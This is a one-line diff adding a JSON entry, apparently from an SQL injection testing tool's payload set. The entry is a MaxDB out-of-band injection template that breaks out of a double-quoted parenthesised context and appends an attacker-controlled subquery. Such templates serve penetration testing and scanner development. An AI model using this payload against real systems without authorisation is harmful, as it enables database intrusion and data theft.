@@ -1,0 +1,1 @@
+{"dbms": "maxdb", "technique": "oob", "boundary": {"prefix": "\")", "suffix": "-- -", "type": "paren-double"}, "vector": "{B} AND 1=(SELECT ({Q}))/*OOB {OOB}*/", "comment": "maxdb oob: double in paren"}
